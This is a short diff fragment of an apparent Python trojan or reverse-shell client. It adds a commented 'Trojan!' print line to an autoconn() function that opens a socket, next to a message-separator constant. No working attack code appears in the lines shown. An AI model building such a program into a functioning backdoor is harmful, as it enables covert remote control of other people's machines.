@@ -13,6 +13,7 @@ BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 SEPARATOR = "<sep>"
 
 def autoconn():
+    # print("Trojan!")
     try:
         # create the socket object
         s = socket.socket()
